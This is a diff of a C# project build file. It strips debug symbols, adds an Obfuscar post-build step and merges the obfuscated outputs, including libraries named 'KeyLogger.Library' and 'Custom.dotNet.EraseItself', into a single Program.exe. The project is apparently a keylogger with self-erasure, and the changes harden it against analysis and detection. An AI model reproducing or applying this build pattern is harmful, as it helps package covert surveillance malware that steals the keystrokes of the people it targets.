@@ -25,12 +25,15 @@
   </PropertyGroup>
   <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
     <PlatformTarget>AnyCPU</PlatformTarget>
-    <DebugType>pdbonly</DebugType>
+    <DebugType>none</DebugType>
     <Optimize>true</Optimize>
     <OutputPath>bin\Release\</OutputPath>
     <DefineConstants>TRACE</DefineConstants>
     <ErrorReport>prompt</ErrorReport>
     <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup>
+    <RunPostBuildEvent>OnOutputUpdated</RunPostBuildEvent>
   </PropertyGroup>
   <ItemGroup>
     <Reference Include="System" />
@@ -59,6 +62,12 @@
   <ItemGroup>
     <None Include="packages.config" />
   </ItemGroup>
+  <ItemGroup>
+    <Content Include="obfuscar.xml">
+      <CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory>
+      <SubType>Designer</SubType>
+    </Content>
+  </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
   <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
        Other similar extension points exist, see Microsoft.Common.targets.
@@ -71,14 +80,17 @@
   <UsingTask TaskName="ILMerge.MSBuild.Tasks.ILMerge" AssemblyFile="$(SolutionDir)\packages\ILMerge.MSBuild.Tasks.1.0.0.3\tools\ILMerge.MSBuild.Tasks.dll" />
   <Target Name="AfterBuild">
     <ItemGroup>
-      <MergeAsm Include="$(OutputPath)$(TargetFileName)" />
-      <MergeAsm Include="$(OutputPath)KeyLogger.Library.dll" />
-      <MergeAsm Include="$(OutputPath)Custom.dotNet.EraseItself.dll" />
+      <MergeAsm Include="$(OutputPath)Obfuscator_Output\$(TargetFileName)" />
+      <MergeAsm Include="$(OutputPath)Obfuscator_Output\KeyLogger.Library.dll" />
+      <MergeAsm Include="$(OutputPath)Obfuscator_Output\Custom.dotNet.EraseItself.dll" />
     </ItemGroup>
     <PropertyGroup>
-      <MergedAssembly>$(ProjectDir)$(OutDir)Program.exe</MergedAssembly>
+      <MergedAssembly>$(ProjectDir)$(OutDir)Obfuscator_Output\Program.exe</MergedAssembly>
     </PropertyGroup>
     <Message Text="ILMerge @(MergeAsm) -&gt; $(MergedAssembly)" Importance="high" />
     <ILMerge InputAssemblies="@(MergeAsm)" OutputFile="$(MergedAssembly)" TargetKind="SameAsPrimaryAssembly" />
   </Target>
+  <PropertyGroup>
+    <PostBuildEvent>"C:\Obfuscator.Net\Obfuscar.Console.exe" $(TargetDir)obfuscar.xml</PostBuildEvent>
+  </PropertyGroup>
 </Project>
